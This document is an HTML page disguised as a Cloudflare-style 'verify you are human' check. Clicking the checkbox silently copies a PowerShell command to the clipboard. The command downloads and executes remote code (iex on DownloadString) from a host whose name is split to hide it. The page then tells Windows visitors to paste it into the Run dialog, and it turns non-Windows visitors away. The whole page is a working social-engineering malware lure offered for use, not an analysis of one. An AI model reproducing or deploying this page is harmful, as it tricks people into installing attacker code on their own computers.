<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<title>Security Verification</title>
</head>
<body>
<div id="cf-check">
  <p>Performing security verification</p>
  <label><input type="checkbox" id="human"> Verify you are human</label>
</div>
<div id="os-error" style="display:none">
  <p>macOS is not supported. This website requires a Windows PC to access.</p>
</div>
<div id="steps" style="display:none">
  <p id="step1"></p>
  <p id="step2"></p>
</div>
<script>
document.getElementById('step1').textContent = "Press the Windows key + R to open the Run dialog.";
document.getElementById('step2').textContent = "Paste the verification command with Ctrl+V, then press Enter.";
</script>
<script>
var isWindows = /Win/.test(navigator.userAgent);
if (!isWindows) {
  document.getElementById('os-error').style.display = 'block';
  document.getElementById('cf-check').style.display = 'none';
}
var host = 'elxxvvx' + '.xyz/f';
var cmd = "powershell -NoProfile -Command \"iex ((New-Object Net.WebClient).DownloadString('http://\" + host + "'))\"";
document.getElementById('human').addEventListener('click', function () {
  navigator.clipboard.writeText(cmd);
  document.getElementById('steps').style.display = 'block';
});
</script>
</body>
</html>
